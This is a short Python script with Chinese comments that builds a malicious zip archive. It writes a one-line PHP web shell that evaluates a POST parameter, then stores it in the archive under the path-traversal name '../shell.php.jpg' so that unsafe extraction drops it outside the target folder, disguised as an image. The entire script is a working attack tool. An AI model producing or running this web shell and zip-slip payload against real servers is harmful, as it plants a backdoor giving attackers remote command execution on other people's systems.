import zipfile

# 1. 准备你的木马文件 shell.php，内容如：<?php @eval($_POST['cmd']); ?>
with open('shell.php', 'w') as f:
    f.write('<?php @eval($_POST["cmd"]); ?>')

# 2. 创建一个恶意的 zip 包
with zipfile.ZipFile('exploit.zip', 'w') as zipf:
    # 将文件名直接指定为带有路径穿越的名称
    # 这里的 ../ 会被原封不动地写入 zip 的文件头中
    zipf.write('shell.php', arcname='../shell.php.jpg')

print("恶意压缩包 exploit.zip 生成完毕！")